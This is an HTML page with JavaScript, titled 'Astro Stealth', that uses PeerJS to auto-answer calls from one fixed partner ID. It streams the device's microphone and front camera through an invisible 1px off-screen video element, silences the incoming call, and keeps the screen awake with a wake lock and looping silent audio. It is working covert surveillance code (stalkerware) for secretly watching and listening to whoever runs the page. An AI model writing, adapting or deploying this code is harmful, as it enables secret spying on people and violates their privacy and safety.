<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let wakeLock = null;
        
        function log(msg) {
            console.log(`[STEALTH] ${msg}`);
        }
        
        // Prevent screen lock
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
            
            const silentAudio = new Audio();
            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
            silentAudio.loop = true;
            silentAudio.volume = 0;
            silentAudio.play().catch(e => {});
        }
        
        async function getStealthStream(isVideo) {
            const constraints = {
                audio: true,
                video: isVideo ? {
                    facingMode: "user",
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } : false
            };
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                log(`Stream acquired - Audio: ${stream.getAudioTracks().length > 0}, Video: ${stream.getVideoTracks().length > 0}`);
                return stream;
            } catch (e) {
                log(`Stream error: ${e.message}`);
                throw e;
            }
        }
        
        async function handleIncomingCall(call) {
            const isVideo = call.metadata?.type === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call`);
            
            try {
                const stream = await getStealthStream(isVideo);
                localStream = stream;
                
                if (isVideo && stream.getVideoTracks().length > 0) {
                    document.getElementById('localVideo').srcObject = stream;
                }
                
                call.answer(stream);
                currentCall = call;
                
                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'}`);
                
                call.on('stream', (remoteStream) => {
                    if (remoteStream) {
                        remoteStream.getTracks().forEach(track => track.enabled = false);
                    }
                });
                
                call.on('close', () => {
                    log('Call ended');
                    endCall();
                });
                
            } catch (err) {
                log(`Failed to answer: ${err.message}`);
                call.close();
            }
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
        }
        
        function initPeer() {
            if (peer) peer.destroy();
            
            log(`Starting stealth as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', () => {
                log(`✅ Stealth active - waiting for ${PARTNER_ID}`);
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    dataConn = conn;
                    log('Data connection established');
                } else {
                    conn.close();
                }
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    call.close();
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('=== ASTRO STEALTH ===');
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
